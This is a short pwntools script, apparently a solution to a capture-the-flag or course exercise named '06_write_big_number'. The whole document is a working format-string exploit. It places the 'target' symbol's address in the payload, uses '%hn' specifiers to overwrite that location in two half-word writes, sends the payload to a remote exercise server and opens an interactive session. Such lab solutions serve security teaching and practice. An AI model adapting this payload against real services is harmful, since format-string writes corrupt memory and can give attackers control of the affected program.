from pwn import *

elf = ELF("06_write_big_number")
adr = elf.symbols['target']

HOST = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 23196 

io = connect(HOST, PORT)

payload =  p32(adr) + p32(adr + 2) + b"%48871x%7$hn" + b"%8126x%8$hn"

io.sendline(payload)
io.interactive()
